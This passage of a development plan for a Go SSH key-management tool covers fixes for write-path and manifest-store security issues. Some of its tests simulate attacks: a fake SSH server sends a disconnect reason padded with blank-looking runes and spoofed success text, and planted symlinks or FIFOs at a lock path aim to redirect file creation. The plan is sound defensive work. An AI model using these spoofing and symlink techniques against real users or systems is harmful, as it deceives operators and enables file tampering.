func RemoteSnippet(s string) string {
	var b strings.Builder
	n, pendingSpace := 0, false
	for _, r := range s {
		switch {
		case unicode.IsSpace(r):
			pendingSpace = n > 0
			continue
		case unicode.IsControl(r) || unicode.Is(unicode.Cf, r):
			continue
		case !snippetRune(r):
			r = '?'
		}
		need := 1
		if pendingSpace {
			need = 2
		}
		if n+need > MaxSnippet {
			b.WriteString(truncMark)
			return b.String()
		}
		if pendingSpace {
			b.WriteByte(' ')
			pendingSpace = false
		}
		b.WriteRune(r)
		n += need
	}
	return b.String()
}
```

Replace `strings.TrimSpace(SanitizeRemote(…))` with `sanitize.RemoteSnippet(…)` at sshconn.go:97-98 and :111 (11B), and in `stageFailure` at sshwrite.go:609-610 through a thin `sshconn.RemoteSnippet` wrapper or a direct `sanitize` import (11A; the import already exists transitively). Leave `SanitizedError` alone: it also wraps our own long messages (`LockoutError`), which must not be cut.

- [ ] **Step 4: Run them and watch them pass.** `go test ./internal/sanitize/ ./internal/sshconn/ ./internal/sshwrite/`. Also run `go test -run x -fuzz FuzzRemoteSnippet -fuzztime 20s ./internal/sanitize/`. P13's discovered `make fuzz-list` picks the new target up; no Makefile edit.

#### Task 7b (11B): SEC-8, bounded server text in handshake and disconnect errors

> **Added by the review panel (security-writepath).** Server-controlled text also reaches error lines through the SSH transport **before** the host key is verified: the disconnect reason in `ssh: disconnect, reason N: <text>` and kex/version failures. connect.go:225 wraps them with `fmt.Errorf("ssh %s@%s: %w", …, err)`, and only `SanitizedError` touches them, which keeps U+2800/U+3164/U+115F. A network attacker who cannot impersonate the host key can send a disconnect during kex, so this path is easier to exploit than the post-auth stderr. `internal/sshconn/connect.go` is free in W2 (P07 owned it in W1), so 11B owns it here and SEC-8 is fully fixed in this package.

**Files:** `internal/sshconn/connect.go` (the handshake error wrap at :222-226), `internal/sshconn/connect_test.go`

- [ ] **Step 1: Write the failing test** in `connect_test.go`. A raw TCP listener speaks just enough SSH to send a pre-kex disconnect:

```go
// TestHandshakeDisconnectTextIsBounded (SEC-8): a server that sends
// SSH_MSG_DISCONNECT during kex controls the error text; it must come back
// bounded and without blank-looking runes.
func TestHandshakeDisconnectTextIsBounded(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = ln.Close() })
	desc := strings.Repeat("⠀", 1<<14) + "\n✓ present & authorized"
	go func() {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		defer c.Close()
		_, _ = io.WriteString(c, "SSH-2.0-evil\r\n")
		// payload: byte 1 (disconnect), uint32 reason 2, string desc, string lang ""
		payload := []byte{1, 0, 0, 0, 2}
		payload = binary.BigEndian.AppendUint32(payload, uint32(len(desc)))
		payload = append(payload, desc...)
		payload = binary.BigEndian.AppendUint32(payload, 0)
		pad := 8 - (5+len(payload))%8
		if pad < 4 {
			pad += 8
		}
		pkt := binary.BigEndian.AppendUint32(nil, uint32(1+len(payload)+pad))
		pkt = append(pkt, byte(pad))
		pkt = append(pkt, payload...)
		pkt = append(pkt, make([]byte, pad)...)
		_, _ = c.Write(pkt)
		_, _ = io.Copy(io.Discard, c) // keep reading the client's KEXINIT
	}()
	port := ln.Addr().(*net.TCPAddr).Port
	d := &Dialer{KnownHostsPath: sshtest.KnownHostsFile(t), Creds: &Credentials{AgentSock: sshtest.Agent(t, sshtest.Key(1))}, DialTimeout: time.Second}
	_, err = d.Connect(ctxTimeout(t, 5*time.Second), config.Server{Name: "evil", Host: "127.0.0.1", Port: port, User: "u"})
	if err == nil {
		t.Fatal("dial succeeded against a disconnecting server")
	}
	msg := err.Error()
	if len(msg) > 512 || strings.ContainsRune(msg, '⠀') || strings.Contains(msg, "\n") {
		t.Errorf("handshake error not bounded: %d bytes, %q…", len(msg), msg[:min(len(msg), 120)])
	}
}
```

The `Dialer` setup mirrors `TestConnectDialRefusedMentionsBastion` (connect_test.go:273); `ctxTimeout` is the existing helper there. The imports gain `encoding/binary` and `io`.

- [ ] **Step 2: Run it and watch it fail.** `rtk proxy go test ./internal/sshconn/ -run TestHandshakeDisconnectTextIsBounded -v`: the message is ~48 KiB and holds U+2800.
- [ ] **Step 3: Implement.** In `connect.go`, wrap the transport error so its text is bounded while `errors.Is/As` and the kind classification still see the original:

```go
// remoteText bounds server-controlled transport text (disconnect reasons,
// version and kex failures) for error lines; Unwrap keeps classification.
type remoteText struct{ err error }

func (e remoteText) Error() string { return sanitize.RemoteSnippet(e.err.Error()) }
func (e remoteText) Unwrap() error { return e.err }
```

and change the handshake failure return at :225 to `classify(handshakeKind(ctx, err), fmt.Errorf("ssh %s@%s: %w", srv.User, addr, remoteText{err}))`. The host-key verdict branch (our own text) stays as it is.
- [ ] **Step 4: Run it and watch it pass**, plus `go test ./internal/sshconn/...` (the kind tests must stay green).

#### Task 8 (11A): integration cases on a real sshd

**Files:** `internal/sshwrite/integration_test.go`. These use the existing refusal-only fixture user `cas`, so scripts/integration.sh (owned by P03/P13) needs no change.

- [ ] **WP-9:**

```go
func TestIntegrationRefusalCreatesNoDirectory(t *testing.T) {
	w, host, port := itWriter(t)
	srv := config.Server{Name: "wp9", Host: host, Port: port, User: "cas", AuthorizedKeysFile: "~/wp9/dot-ssh/authorized_keys"}
	remoteOut(t, w.Dialer, srv, `mkdir -p "$HOME/wp9" && chmod 777 "$HOME/wp9"`)
	t.Cleanup(func() { remoteOut(t, w.Dialer, srv, `rm -rf "$HOME/wp9"`) })
	req := Request{Content: itRendered(t), Expect: Snapshot{Absent: true}, Survivors: itSurvivors(t)}
	var uns *UnsafePathError
	if err := w.Apply(itCtx(t), srv, req); !errors.As(err, &uns) {
		t.Fatalf("Apply = %v, want *UnsafePathError", err)
	}
	if out := remoteOut(t, w.Dialer, srv, `if [ -e "$HOME/wp9/dot-ssh" ]; then echo created; fi`); strings.TrimSpace(out) != "" {
		t.Error("a refused write created ~/wp9/dot-ssh")
	}
}
```

- [ ] **WP-3:** `TestIntegrationConcurrentEditDuringUploadRefused` on user `cas`.
  - Capture `before := cat ~/.ssh/authorized_keys` and the `.bak` (`cat … 2>/dev/null || true`).
  - Wrap `w.exec` like `TestIntegrationInterruptedWriteLeavesOriginal` (:344). When `stdin != nil`, return a reader that delivers the first half of a ~130 KB padded render. On its next `Read`, it **first polls over a second connection** (`wc -c < "$HOME/.ssh/authorized_keys.sshepherd.tmp" 2>/dev/null`, every 50 ms, up to 10 s) until the temp holds at least half the bytes, the same synchronisation the unit `runShConcurrent` uses. The temp only exists once the old-order CAS has passed, so the edit always lands after that CAS (a ~130 KB render fits in OpenSSH's 2 MB channel window, so without this wait both Reads can finish before the script reaches its CAS and the old code also exits 46). Then it appends `# concurrent edit` over the second connection (a non-fatal `remoteOut` variant that records the error, since this is not the test goroutine), then delivers the rest.
  - **Step 2 for this case:** before Task 2 is implemented, run the test against the pre-P11 script and record the FAIL (exit 0, the appended line lost, `.bak` without it). It must fail there deterministically; if it ever passes on the old script, the wait is wrong.
  - Assert `errors.As(err, &*ChangedError)`, that the file equals `before + "# concurrent edit\n"`, and that the `.bak` is unchanged.
  - Add `t.Cleanup` to write `before` back, so `TestIntegrationChangedSincePlanRefused` keeps its seed.
- [ ] **WP-4 smoke:** in `TestIntegrationApplyWriteBackupVerify` (:137), after the write, assert that `ls -a ~/.ssh` lists no `.sshepherd.cas`. busybox `dd conv=fsync` runs on Alpine, so the success path shows the flush lines do not fail the script.
- [ ] **WP-5 (real sshd):** `TestIntegrationProbeOrderMatchesNextRun`: on user `cas`, the render puts `command="echo forced" <itKey(1)>` first and plain `<itKey(2)>` second, with both keys held. After `Apply`, open a fresh read with `PreferKeys = audit.OfferOrder(desired)` and assert it reads the real file (not `forced`). Uses the existing `itWriter`/`itRendered` helpers with an extra survivor.

Run: `make integration`. The integrator runs it on the merged tree.

---

#### README / CLAUDE.md / golden updates (integrator)

No golden changes: no renderer is touched. Exact README edits:

1. **README.md:1414-1421 ("One guarded write per server").** Replace it with:
   > Each write is a single remote script in one session, which in order: refuses an unsafe path — walking the nearest existing ancestor *before* creating any missing directory and the full path again after, removing anything it created on a refusal, so a refusal leaves nothing behind; takes the per-file lock `<path>.sshepherd.lock`; uploads to `<path>.sshepherd.tmp` under `umask 077`, checks the received byte count and flushes it to disk; then, in one tight step, copies the current file aside, compares that copy with the plan's snapshot (byte length plus POSIX `cksum`, or absent vs. present) so *what you reviewed is what gets replaced* — a key another tool added during the upload refuses the write (`changed since the plan was read`) instead of vanishing — keeps that same copy as `.sshepherd.bak` (flushed too), and `mv`s the upload into place. Flushes are per file (`dd conv=fsync`, never a global `sync`); the directory entry is not flushed, so after a crash you see either the old or the new complete file. Readers never see a half-written file, and a dropped connection leaves the original untouched (`upload incomplete … original left untouched`).
2. **Refusals list (:1395-1412).** Change the lead to "…and nothing changed — no file, backup or directory is created — when:". Add the bullet: "the manifest grants nobody and nothing is installed, but `~/.ssh/authorized_keys2` holds keys (`authorized_keys2 holds keys but the manifest grants none — refusing to wipe; remove it by hand`); `audit` reports the same server as drift, so both exit 1;".
3. **keys2 scope.** At :265, "When the effective path is the default" becomes "When the effective path is the default — or any spelling that resolves on the server to the login user's `~/.ssh/authorized_keys`, such as `/home/alice/.ssh/authorized_keys` —". At :347, "(checked only when the audited path is the default)" becomes "(checked when the audited path is the default or resolves to it)". At :1429-1430, "(default path only)" becomes "(default path or an equivalent spelling)". At :1432-1433, "A server apply does not write (refused, or no grants)" becomes "A server apply does not write (refused)".
4. **Probe order (:1438-1441).** "(unrestricted ones first, then key files before agent keys, so a surviving `--identity` key is the one proven)" becomes "(in the order every later run offers them: plain lines first, then `from=`/`expiry-time=`/`restrict` lines, then forced `command=` lines, each group in manifest order — so the probe exercises the key the next `audit` or `apply` logs in with)". At :1255, "the post-write probe (which offers surviving key files first) proves the new key logs in" becomes "the post-write probe proves a surviving key logs in; pass only the new key file to the next run to prove it headless".
5. **Key offering (:1454-1456).** "Keys granted on the server (operators first) are offered first" becomes "Keys granted on the server are offered first — operators, then grant order, with lines that force a `command=` (and `cert-authority` lines) last, so a forced command never captures sshepherd's session while a plain key is held —".
6. **Output safety (:1457-1458).** Append: "Server-supplied text in error lines (remote stderr) is further reduced to printable ASCII plus Latin letters (anything else shows as `?`), collapsed to one line, and cut at 256 characters (`…(truncated)`)."
7. **CLAUDE.md Status.** Add one sentence: "Write-path correctness pass (P11): CAS on a snapshot copy after the upload with `.bak` = validated bytes, per-file flush of the temp and `.bak` (never a global `sync`), refusals create nothing (even through `..`), one `audit.OfferOrder` for every connection and the probe, keys2 on equivalent default spellings, no-grant + keys2 refused, `sanitize.RemoteSnippet` bounds remote stderr and handshake/disconnect text." In the existing "survivor order (key files before agent keys)" phrase (CLAUDE.md:321), change the parenthetical to "(production offer order)".

#### Risks and how to verify

- **Flush durability is best effort.** The temp and `.bak` are flushed with `dd conv=notrunc,fsync`; a host whose `dd` lacks `conv=fsync` skips the flush silently (`|| :`). The directory entry is never flushed, so a crash can lose the rename and keep the old complete file. No global `sync` ever runs, so a hung NFS mount cannot pin the lock. Verify: `TestWriteCmdFlushesPerFileNeverGlobalSync` under dash and bash, plus the Alpine/debian/rocky integration runs.
- **The CAS now runs after the upload.** A doomed write still uploads its bytes, so a refusal costs one upload. The `cksum` presence check is moved ahead of the upload so that failure is still cheap.
- **Extra staging file `.sshepherd.cas`.** The EXIT trap removes it, and `assertNoResidue` covers it. A SIGKILLed shell can leave it behind, the same as `.tmp` today. P08's lock-info work (D11) should list it as possible residue.
- **New `GrantedFingerprints` order.** This changes which key audit, adopt and apply log in with when several are held. That is the intended effect, but a cmd-level test that pinned the old order would fail. Verify: `go test ./cmd/sshepherd/` and the `make integration` E2E (adopt → apply → revoke → audit → rotate, and headless rotate).
- **One probe, production order.** An interactive run with an agent key first proves the agent key, not the `--identity` file; a later headless run with only that file is proven by its own probe. The headless rotate E2E (only key files) still passes. A warn-only headless proof is D9b (P08).
- **keys2 probe on non-default paths.** Each such read adds one short session. A `cd -P` on an unreadable `~/.ssh` exits 0 (not equivalent), which fails safe toward today's behavior.
- **Later packages that edit the same code.** P08 (WP-1/2/6/7/8 semantics) and P14 (wave 3) touch `writeCmdFor`, `probeOrRestore`, `exec.go`, `plan.go` and `audit.go`. They must rebase on this order and keep `TestWriteCmdOrder` and `TestProbeOfferEqualsProductionOffer` green.

#### Acceptance

```bash
test -z "$(gofmt -l .)" && test -z "$(goimports -l .)"   # both print nothing
go vet ./...
go test -race ./internal/sanitize/ ./internal/sshconn/... ./internal/sshread/ ./internal/sshwrite/ ./internal/apply/ ./internal/audit/ ./cmd/sshepherd/
go test -run x -fuzz FuzzRemoteSnippet -fuzztime 30s ./internal/sanitize/
make check          # lint, gosec, deadcode, govulncheck, coverage gate ≥ 80%
make integration    # new TestIntegrationKeys2OnAbsoluteDefaultPath, TestIntegrationRefusalCreatesNoDirectory,
                    # TestIntegrationConcurrentEditDuringUploadRefused, TestIntegrationProbeOrderMatchesNextRun, plus the full E2E loop
test ! -e internal/sanitize/snippet_stub.go
git diff --stat     # only the files listed under "Files owned" + README.md + CLAUDE.md
```

#### Out of scope

- All on-hold items: prune, `apply --force`, `import --prefer`, key generation and scheduled rotation, move-key, and **apply wipe/empty-server mode** (COR-2 only refuses).
- WP-1/WP-2/WP-6/WP-7/WP-8 (probe-failure semantics, a watchdog, the lockout exit code, lock metadata, keys2 backup naming). These belong to P08's spec (decisions D9, D9b, D10; stated D11–D13).
- Report renderers (`internal/apply/report.go`, `internal/audit/report.go`, the JSON renderers) and their goldens.
- Detecting non-default `AuthorizedKeysFile` layouts in `sshd_config` (D18 / PRD-9).
- Per-key restriction policy (D19, D22).

---

### P12 — One safe manifest store for every manifest write; one schema encoder; revoke resolves names first; honest adopt --partial

> **Program notes (master plan):** Ownership amended: also `internal/manifest/fuzz_test.go` and `cmd/sshepherd/testdata/help/adopt.golden`. F-P07-1 (adopt's dial hint) moved to W1 round 2 (lane P07-F1), so P12 no longer owns `internal/adopt/adopt.go`. `keyarg.go` gets a doc comment only; `keyarg_test.go` is not touched. D8 gates Task 8b; D8a gates the zero-read exit 3. **Stream C runs in W2 round 2**, branched from the round-1 commit that contains Stream A, so it compiles and runs its own FAIL → PASS steps.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Every manifest write goes through one store in `internal/manifest`. That covers revoke/rotate saves, in-place `adopt`/`import --merge -o FILE`, and new `-o` files. An in-place merge can no longer undo a concurrent revoke, and the lock sidecar cannot be turned into a symlink attack. Fresh and appended manifests come from one encoder driven by the `config` types. `revoke NAME` treats a real user name as a user. `adopt --partial` stops pretending a fully unreadable fleet was adopted.

**Architecture:** `cmd/sshepherd`'s `manifestTarget` (edit.go:53-167), `lockManifest`/`keepOwner` (edit_lock_unix.go, edit_lock_other.go) and `writeFileNoClobber` (manifest_out.go:63-170) move into `internal/manifest/store.go` + `store_unix.go` + `store_other.go` as `manifest.Store` / `manifest.Read` / `manifest.WriteFile`. `cmd/sshepherd/edit.go` keeps a thin `manifestTarget{manifest.Store}` adapter, so `apply.go`, `editrun.go`, `json_cmd_test.go`, `edit_stream_test.go` and the `beforeManifestSave` seam in `revoke_test.go` do not change. A new `publishManifest` (manifest_out.go) sends `-o` either to `Store.Save` (same file as the manifest read, `os.SameFile` after `EvalSymlinks`) or to `manifest.WriteFile` (any other path). The new `manifest.Generate` and the rebuilt `Append` both encode from `config.User/Server/Access` through one reflection-driven, omitempty-aware `entryNode`. That retires `userOut/serverOut/accessOut/manifestOut` (manifest_out.go:15-45) and `manifest.UserEntry/ServerEntry/AccessEntry` (manifest.go:47-74).

**Tech Stack:** Go 1.27 (`go.mod` 1.27.3), `gopkg.in/yaml.v3` node API, `syscall` (flock, `O_NOFOLLOW`, `Stat_t`), Cobra, the existing hermetic `sshtest` fixtures (`editFleet` in revoke_test.go:33), golden files (`-update`), goleak.

**Baseline:** Line numbers cite HEAD `adee207`. P12 runs **after P05 and P06**. P06 rewrites `adopt.go` (connFlags, `fleetSession`, `manifestError`, adopt `--merge` already read via `readManifest`, pluralized strings), `import.go` (`manifestError("--merge", …)`), `revoke.go:49-66` (followUp) and `edit.go:14-51` (runFlags). So **re-read every cmd file before editing**. The snippets below name symbols, not line numbers, wherever P06 moves code. If P06 already turned adopt `--merge` into `readManifest(cf.cfgPath)` + `m.Loaded`, Task 6 Step 3a is already done for that branch.

---

#### Header

| | |
|---|---|
| **kind** | fix |
| **wave** | 2 (parallel with P11 and P13 — disjoint files, see Conflicts) |
| **depends_on** | P05 (keyarg.go option table, adopt ignored-line issues), P06 (adopt/import/revoke/edit rewrites, `connFlags`, `manifestError`, `apply.Plural`) |
| **owner decisions** | **D8** (adopt `--partial` exit code when only some servers were read) and **D8a** (adopt with zero readable servers: exit 3). If D8 is unanswered at wave start, Task 8b is skipped and exit 0 stays. If D8a is unanswered, the zero-read case keeps today's exit and only its "nothing to adopt" wording is fixed. No other decision is needed. Every other change here tightens safety or fixes a bug inside the documented contracts. |

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| ARC-1 | MED | `adopt/import --merge X -o X --force` publishes via `writeFileNoClobber` (manifest_out.go:77-118). That path has no lock, no changed-since-read check, and a hard-coded `Chmod(0o600)`, so a revoke saved while adopt reads the fleet is silently undone, and a group-shared manifest becomes owner-only. |
| ARC-6 | LOW | The schema exists in four shapes (config types, `userOut/serverOut/accessOut`, `manifest.*Entry`, `userNode/serverNode/accessNode`). A future field missed in one copy is silently stripped by `adopt` regeneration. |
| SEC-7 | LOW | The lock sidecar opens with `O_RDWR|O_CREATE` (edit_lock_unix.go:17) and follows symlinks. A root run can be steered into creating e.g. `/etc/nologin`. |
| TST-8 | LOW | `keepOwner` (edit_lock_unix.go:38-52) is 55.6% covered, and the chown and refusal paths never run. While reading it we also found a latent bug: it compares the original's owner with the **process** ids, not the temp file's. Under BSD/darwin directory-group inheritance or a Linux setgid directory, the gid silently changes. |
| COR-3 | LOW | `revokeTargets` (revoke.go:84-88) rejects any argument where `looksLikeKey` is true (keyarg.go:109-134) **before** the manifest is read. Valid users such as `tunnel`, `pty`, `Alice Smith`, `ssh-rsa-legacy` or `ab:cd` cannot be revoked by name. |
| UX-4 | LOW | With every server unreachable, `adopt --partial` logs `nothing to adopt …`, writes a manifest and exits 0 (adopt.go:179-223, 291). The README exit-code table (README.md:1340-1350) has no adopt/import rows. |

#### Files owned (exclusive in wave 2)

- New: `internal/manifest/store.go`, `internal/manifest/store_unix.go`, `internal/manifest/store_other.go`, `internal/manifest/store_test.go`
- Modify: `internal/manifest/manifest.go`, `internal/manifest/manifest_test.go`, **`internal/manifest/fuzz_test.go`** (added: it calls `Append` with `UserEntry/ServerEntry/AccessEntry` at fuzz_test.go:85-89, and no other package owns it)
- Modify: `cmd/sshepherd/edit.go` (manifestTarget block only, lines 53-167; P06's runFlags block above it is untouched), `cmd/sshepherd/manifest_out.go`, `cmd/sshepherd/manifest_out_test.go`, `cmd/sshepherd/edit_save_test.go`, `cmd/sshepherd/edit_test.go`, `cmd/sshepherd/adopt.go`, `cmd/sshepherd/adopt_test.go`, `cmd/sshepherd/import.go`, `cmd/sshepherd/import_test.go`, `cmd/sshepherd/import_merge_test.go`, `cmd/sshepherd/revoke.go`, `cmd/sshepherd/revoke_test.go`, `cmd/sshepherd/keyarg.go` (doc comment on `looksLikeKey` only), `cmd/sshepherd/keyarg_test.go` (untouched unless the comment test needs it)
- Delete: `cmd/sshepherd/edit_lock_unix.go`, `cmd/sshepherd/edit_lock_other.go`
- New: `cmd/sshepherd/schema_roundtrip_test.go`
- Goldens: `cmd/sshepherd/testdata/adopt_*.golden`, `cmd/sshepherd/testdata/import_*.golden` (expected **byte-identical**), **`cmd/sshepherd/testdata/help/adopt.golden`** (added: Task 8 changes adopt's `Long`. P01/P06 created this file, and no wave-2 package owns it)
- Integrator only: `README.md`, `CLAUDE.md` (Status), spec amendment lines in `docs/superpowers/specs/2026-10-23-revoke-rotate-design.md`, `2026-07-16-adopt-merge-design.md`, `2026-07-19-import-merge-design.md`

**Not touched (deliberately):** `cmd/sshepherd/run.go` / `run_test.go` (P13 owns them in wave 2). Exit 1 reuses the existing `errFleetUnreadable` sentinel (run.go:32,167), and exit 3 is the default branch of `exitCodeFor`. Also untouched: `apply.go`, `editrun.go`, `json_cmd_test.go`, `edit_stream_test.go`, `rotate*.go`. The adapter keeps `readManifest`, `manifestTarget`, `.Unchanged()`, `.Save()`, `beforeManifestSave` and `errManifestLocked` source-compatible. `.golangci.yml` is P13's, so the plan uses `//nolint:wrapcheck` with a reason instead of adding ignore globs.

#### Internal parallelism (one workflow, three agents in worktrees, no commits)

| Stream | Tasks | Files | Starts |
|---|---|---|---|
| **A** (internal/manifest) | 1, 2, 3, 4 | `internal/manifest/store*.go`, `manifest.go`, `manifest_test.go`, `fuzz_test.go` | immediately |
| **B** (revoke) | 9 | `revoke.go`, `revoke_test.go`, `keyarg.go` | immediately |
| **C** (cmd wiring) | 5, 6, 7, 8 | `edit.go`, `edit_lock_*.go`, `edit_save_test.go`, `edit_test.go`, `manifest_out*.go`, `adopt*.go`, `import*.go`, `schema_roundtrip_test.go`, goldens, `testdata/help/adopt.golden` | **W2 round 2**, in a worktree at the round-1 `baseSha` that already contains A's commit; C reports real FAIL then PASS output |
| **Integrator** | 10 | README, CLAUDE.md, spec amendments, `make check`, `make integration` | A+B in round 1, C in round 2 |

**API contract (frozen in round 1; C builds on A's committed code in round 2):**

```go
package manifest
type Store struct{ Path, Resolved string; Loaded []byte; Stream bool }
var ErrLocked error
func Read(path string) (Store, error)
func (s Store) Unchanged() error
func (s Store) SameAs(path string) (bool, error)
func (s Store) Save(data []byte) error
func LockPath(resolved string) string
func WriteFile(path string, data []byte, force bool) error   // ex-writeFileNoClobber
func Generate(header string, users []config.User, servers []config.Server, access []config.Access) ([]byte, error)
func (f *File) Append(comments []string, users []config.User, servers []config.Server, access []config.Access) error
```

Rules for every agent: no commits. Use `rtk proxy go test …` when exact failure lines matter (the rtk hook summarizes). Goldens are rewritten with `-update` only where a task says so, and are then read back by eye.

---

#### Task 1 (ARC-1a): move the store into `internal/manifest`, unchanged behavior

**Files:** create `internal/manifest/store.go`, `store_unix.go`, `store_other.go`, `store_test.go`.

- [ ] **Step 1: Failing test.** Port the existing save tests to the new package so they define the API. In `internal/manifest/store_test.go` (`//go:build linux || darwin`), copy `TestManifestSave`, `TestManifestSaveRace`, `TestManifestSaveLockHeld`, `TestManifestSaveFollowsSymlink` and `TestManifestSaveKeepsMode` from `cmd/sshepherd/edit_save_test.go:26-165`, and `TestReadManifestAndUnchanged` from `cmd/sshepherd/edit_test.go:10-31`. Copy the four `TestWriteFileNoClobber*` tests from `cmd/sshepherd/manifest_out_test.go:54-190`. Rename each test (`TestStoreSave…`, `TestWriteFile…`) and replace `readManifest`→`Read`, `lockManifest`→`lock`, `lockPath`→`LockPath`, `errManifestLocked`→`ErrLocked`, `writeFileNoClobber`→`WriteFile`, `linkFile`→`linkFile`. The CAS test uses a package seam:

```go
// TestStoreSaveCASConflict: a manifest rewritten between Read and Save is never overwritten.
func TestStoreSaveCASConflict(t *testing.T) {
	s := readTemp(t, "users: []\n")
	saved := beforeSave
	beforeSave = func(st Store) {
		if err := os.WriteFile(st.Resolved, []byte("users: []\n# someone else\n"), 0o600); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeSave = saved })
	err := s.Save([]byte("users: []\n# mine\n"))
	if err == nil || !strings.Contains(err.Error(), "changed since it was read; re-run") {
		t.Fatalf("Save = %v, want the compare-and-swap refusal", err)
	}
	if got, _ := os.ReadFile(s.Path); string(got) != "users: []\n# someone else\n" {
		t.Errorf("manifest = %q, want the concurrent edit kept", got)
	}
}

func readTemp(t *testing.T, content string) Store {
	t.Helper()
	p := filepath.Join(t.TempDir(), "sshepherd.yaml")
	if err := os.WriteFile(p, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	s, err := Read(p)
	if err != nil {
		t.Fatalf("Read: %v", err)
	}
	return s
}
```

Also add `TestStoreSameAs`, a table test covering: the same path → true; a symlink to the manifest → true; a different existing file → false; a missing path → false; a zero `Store{}` (no source manifest, as with plain import) → false; a `Stream` store → false; **a hard link to the manifest → error** containing `hard link`. The rename would replace only the read path, so a hard-linked `-o` would silently keep the old bytes. We refuse that instead of guessing.

- [ ] **Step 2: Run, expect FAIL** (`undefined: Read`, `Store`, …): `go test ./internal/manifest/ -run 'TestStore|TestWriteFile|TestReadAndUnchanged'`

- [ ] **Step 3: Implement.** `store.go` (portable) is a move of edit.go:53-167 and manifest_out.go:63-170 with these renames. Doc comments move verbatim, and error strings stay **byte-identical**: `read manifest: …`, `re-read manifest %s: …`, `manifest %s changed since it was read; re-run`, `save manifest %s: …`, `%s already exists; pass --force to overwrite`, `%s is a symlink; refusing to replace it — pass the link's target path instead`. Additions:

```go
// beforeSave is a test seam: it runs at the start of Save, before the lock
// and the compare-and-swap.
var beforeSave = func(Store) {}

// SameAs reports whether path names the very file this Store read (symlinks
// followed): adopt/import -o pointing at the manifest is an in-place update
// and must go through Save. A missing path, a stream and a zero Store are
// never the same. A hard link to the manifest under another name is refused:
// Save renames over the read path only, so the other name would keep the
// old bytes.
func (s Store) SameAs(path string) (bool, error) {
	if s.Stream || s.Resolved == "" {
		return false, nil
	}
	fi, err := os.Stat(path)
	if errors.Is(err, fs.ErrNotExist) {
		return false, nil
	}
	if err != nil {
		return false, fmt.Errorf("stat %s: %w", path, err)
	}
	mi, err := os.Stat(s.Resolved)
	if err != nil {
		return false, fmt.Errorf("re-read manifest %s: %w", s.Path, err)
	}
	if !os.SameFile(fi, mi) {
		return false, nil
	}
	resolved, err := filepath.EvalSymlinks(path)
	if err != nil {
		return false, fmt.Errorf("stat %s: %w", path, err)
	}
	if resolved != s.Resolved {
		return false, fmt.Errorf("%s is a hard link to the manifest %s; pass the manifest's own path", path, s.Path)
	}
	return true, nil
}
```

`Save` = edit.go:122-159 with `beforeSave(s)` after the `Stream` check, `lock(s.Resolved)`, `keepOwner(tmp, fi)`. `writeSynced`, `createExclusive`, `syncDir` and `linkFile` move here unexported. `store_unix.go` (`//go:build linux || darwin`) holds `lock` and `keepOwner`, moved verbatim from edit_lock_unix.go (Tasks 2 and 3 then change them). `store_other.go` (`//go:build !linux && !darwin`) holds `lock` returning `errors.New("saving the manifest needs flock, available on linux and darwin only")` and a no-op `keepOwner`.

- [ ] **Step 4: Run, expect PASS:** `go test -race ./internal/manifest/` and `GOOS=windows go vet ./internal/manifest/` (the other-OS file compiles).

---

#### Task 2 (SEC-7): the lock sidecar refuses symlinks, non-regular files and foreign owners

**Files:** `internal/manifest/store_unix.go`, `internal/manifest/store_test.go`.

- [ ] **Step 1: Failing tests.**

```go
// A planted symlink at the lock name is never followed or created through.
func TestStoreLockRefusesSymlink(t *testing.T) {
	s := readTemp(t, "users: []\n")
	victim := filepath.Join(t.TempDir(), "nologin")
	if err := os.Symlink(victim, LockPath(s.Resolved)); err != nil {
		t.Fatal(err)
	}
	err := s.Save([]byte("users: []\n# x\n"))
	if err == nil || !strings.Contains(err.Error(), "is a symlink") {
		t.Fatalf("Save = %v, want the symlinked-lock refusal", err)
	}
	if _, err := os.Lstat(victim); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("symlink target was created: %v", err)
	}
	if got, _ := os.ReadFile(s.Path); string(got) != "users: []\n" {
		t.Errorf("manifest changed: %q", got)
	}
}

// A FIFO (or any non-regular file) at the lock name is refused without blocking.
func TestStoreLockRefusesNonRegular(t *testing.T) {
	s := readTemp(t, "users: []\n")
	if err := syscall.Mkfifo(LockPath(s.Resolved), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := s.Save([]byte("users: []\n# x\n")); err == nil || !strings.Contains(err.Error(), "not a regular file") {
		t.Fatalf("Save = %v, want the non-regular lock refusal", err)
	}
}

// A lock owned by someone who is neither this euid nor the manifest's owner
// is refused; the seam stands in for a lock planted by another uid.
func TestStoreLockRefusesForeignOwner(t *testing.T) {
	s := readTemp(t, "users: []\n")
	lockFile := LockPath(s.Resolved)
	if err := os.WriteFile(lockFile, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	saved := ownerOf
	ownerOf = func(fi fs.FileInfo) (int, int, bool) {
		uid, gid, ok := saved(fi)
		if fi.Name() == filepath.Base(lockFile) {
			uid = 4242
		}
		return uid, gid, ok
	}
	t.Cleanup(func() { ownerOf = saved })
	if err := s.Save([]byte("users: []\n# x\n")); err == nil || !strings.Contains(err.Error(), "owned by uid 4242") {
		t.Fatalf("Save = %v, want the foreign-owner refusal", err)
	}
}

// sudo on your own manifest: euid differs, but the lock's owner is the
// manifest's owner — accepted (no regression for `sudo sshepherd revoke`).
func TestStoreLockAcceptsManifestOwner(t *testing.T) {
	s := readTemp(t, "users: []\n")
	saved := geteuid
	geteuid = func() int { return 0 }
	t.Cleanup(func() { geteuid = saved })
	if err := s.Save([]byte("users: []\n# x\n")); err != nil {
		t.Fatalf("Save = %v, want success for a lock owned by the manifest's owner", err)
	}
}
```

- [ ] **Step 2: Run, expect FAIL** (the symlink test creates `nothing`'s target, and `ownerOf`/`geteuid` are undefined): `go test ./internal/manifest/ -run TestStoreLock`

- [ ] **Step 3: Implement** in `store_unix.go`:

```go
// Seams: ownerOf reads uid/gid from a FileInfo; geteuid is os.Geteuid.
var (
	ownerOf = func(fi fs.FileInfo) (uid, gid int, ok bool) {
		st, ok := fi.Sys().(*syscall.Stat_t)
		if !ok {
			return 0, 0, false
		}
		return int(st.Uid), int(st.Gid), true
	}
	geteuid = os.Geteuid
)

